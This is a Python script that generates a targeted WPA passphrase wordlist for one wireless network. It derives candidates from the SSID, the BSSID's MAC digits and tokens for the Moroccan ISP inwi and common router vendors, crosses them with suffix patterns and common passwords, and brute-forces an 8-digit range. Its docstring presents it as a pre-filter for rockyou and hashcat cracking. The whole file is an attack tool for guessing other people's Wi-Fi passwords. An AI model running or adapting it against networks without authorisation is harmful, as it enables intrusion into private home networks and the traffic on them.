#!/usr/bin/env python3
"""gen_candidates.py — build a *targeted* WPA wordlist for one network.

Generates context-derived candidates (SSID tokens, BSSID hex, ISP name, country,
CPE model strings) crossed with the suffix patterns provisioning firmware tends
to use, plus a small curated list of common passphrases.

This is a pre-filter, not a substitute for rockyou + hashcat rules on a GPU.

    python3 gen_candidates.py --ssid "inwi Home 4G 6A6EDE" \
        --bssid 54:1f:8d:6a:6e:de -o wordlists/candidates.txt
"""

import argparse
import itertools
import re

COMMON = """12345678 123456789 1234567890 11111111 00000000 password password1
password123 motdepasse maroc12345 maroc2024 inwi1234 inwi12345 inwi2024 inwi2025
inwi2026 inwi@1234 inwi@2024 inwi@2025 inwi@2026 inwi.1234 inwi123456
inwi@123456 inwi4G1234 inwi4g2024 azerty1234 azertyuiop qwerty1234 87654321
11223344 12341234 12121212 12344321 admin1234 admin@123 wifi1234 wifi@1234
0000000000 88888888 99999999 66666666 77777777 123123123 1q2w3e4r 1qaz2wsx
passw0rd Passw0rd123 P@ssw0rd P@ssw0rd123 inwiHome inwiHome4G inwihome4g
home4g1234 Home4G123 Home4G@123 4G12345678 4ginwi1234""".split()

TOKENS = ["inwi", "inwi4g", "inwihome", "inwi home 4g", "home4g", "home", "4g",
          "wifi", "internet", "maroc", "morocco", "maroc telecom", "rtk_ap",
          "realtek", "zte", "huawei", "admin", "root", "default", "cpe"]

SUFFIXES = ["", "0", "1", "2", "3", "4", "5", "7", "9", "00", "01", "07", "10",
            "11", "12", "21", "69", "77", "88", "99", "123", "1234", "12345",
            "123456", "1234567", "12345678", "2020", "2021", "2022", "2023",
            "2024", "2025", "2026", "!", "@", "#", "@123", "@1234", "@12345",
            "@2024", "@2025", "@2026", ".1234", "_1234", "123!"]


def variants(w):
    yield w
    yield w.capitalize()
    yield w.upper()
    yield w.title().replace(" ", "")
    yield w.replace(" ", "")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ssid", required=True)
    ap.add_argument("--bssid", default="")
    ap.add_argument("-o", "--out", default="wordlists/candidates.txt")
    a = ap.parse_args()

    seen = set()
    out = []

    def add(w):
        if 8 <= len(w) <= 63 and w not in seen:
            seen.add(w)
            out.append(w)

    ssid = a.ssid
    tail = re.sub(r"[^0-9a-f]", "", ssid.lower().split()[-1]) if ssid.split() else ""
    mac = re.sub(r"[^0-9a-f]", "", a.bssid.lower())

    tokens = list(TOKENS)
    tokens += [t for t in re.split(r"[\s\-_]+", ssid) if t]
    tokens += [re.sub(r"\s+", "", ssid), re.sub(r"\s+", "", ssid).lower()]
    if tail:
        tokens += [tail, tail.upper(), tail.lower(), "inwi" + tail, tail[-6:],
                   tail[-8:] if len(tail) >= 8 else tail]
    if mac:
        tokens += [mac[-6:], mac[-8:], mac[-10:], mac.upper()[-6:], mac[6:]]

    # token x suffix x case-variant
    for t, s in itertools.product(tokens, SUFFIXES):
        for v in variants(t):
            add(v + s)
    # suffix-first forms (1234inwi)
    for t, s in itertools.product(tokens, ["1234", "2024", "2025", "2026", "1"]):
        add(s + t)

    for w in COMMON:
        add(w)
    for w, s in itertools.product(COMMON, ["", "0", "1", "!", "12", "123"]):
        add(w + s)

    # 8-digit numeric space around the SSID tail / MAC tail, radius +-2000
    for src in (tail[-8:], mac[-8:]):
        if src.isdigit():
            n = int(src)
            for d in range(-2000, 2001):
                add(str(n + d).zfill(8))

    with open(a.out, "w") as f:
        f.write("\n".join(out) + "\n")
    print("wrote %s  (%d candidates)" % (a.out, len(out)))


if __name__ == "__main__":
    main()
